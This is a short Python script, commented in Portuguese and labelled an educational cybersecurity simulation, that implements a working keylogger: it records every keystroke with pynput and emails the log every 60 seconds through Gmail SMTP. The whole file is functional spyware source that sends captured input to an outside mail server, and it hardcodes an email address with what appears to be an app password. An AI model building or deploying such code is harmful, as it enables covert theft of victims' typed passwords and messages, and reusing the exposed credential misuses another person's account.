# Projeto educacional de Cibersegurança
# Simulação de Keylogger em ambiente controlado
# ⚠️ Uso apenas para fins de estudo. Não utilizar em sistemas de terceiros sem autorização.

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = " "
#CONFIGURAÇÕE DE E-MAIL
EMAIL_ORIGEM = "desafios.testes@gmail.com"
EMAIL_DESTINO = "desafios.testes@gmail.com"
SENHA_EMAIL = "aase xzcq bwcj jthx"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
            #print("E-mail enviado com sucesso!")
        except Exception as e:
            print("Erro ao enviar e-mail", e)

        log = ""  # Limpa o log após o envio do e-mail

        # Agendar o envio a cada 60 segudos
        Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
        #with open("keylog.txt", "a", encoding="utf-8") as f:
        #    f.write(key.char)
    except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.backspace:
                #f.write("[<] ")
                log += "[<]"
            else:
                #f.write(f"[{key}]")
                pass #Ignora contro, shift, etc ...
        
# Inicia o keylogger e o envio automatico

with keyboard.Listener(on_press=on_press) as listener:
    #log = ""
    enviar_email()
    listener.join()